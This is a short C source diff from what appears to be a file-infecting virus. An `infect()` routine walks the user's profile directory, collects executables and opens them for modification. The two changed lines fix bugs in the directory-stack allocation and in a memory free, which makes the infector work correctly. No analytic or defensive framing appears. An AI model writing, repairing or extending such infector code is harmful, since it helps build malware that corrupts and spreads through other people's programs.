@@ -349,7 +349,7 @@ int infect(void)
    iat.strncat(search_root, profile_directory, iat.strlen(profile_directory));
 
    /* create a stack of directory names to traverse */
-   CVector search_stack = cvector_alloc(&iat, sizeof(char *), search_stack_size);
+   CVector search_stack = cvector_alloc(&iat, sizeof(char *), 1);
    CVECTOR_CAST(&search_stack, char **)[0] = search_root;
 
    CVector found_executables = cvector_alloc(&iat, sizeof(char *), 0);
@@ -471,7 +471,7 @@ int infect(void)
          iat.closeHandle(exe_handle);
       
    end_exe_loop:
-      iat.free(found_executables[i]);
+      iat.free(executable);
    }
 
    cvector_free(&iat, &found_executables);
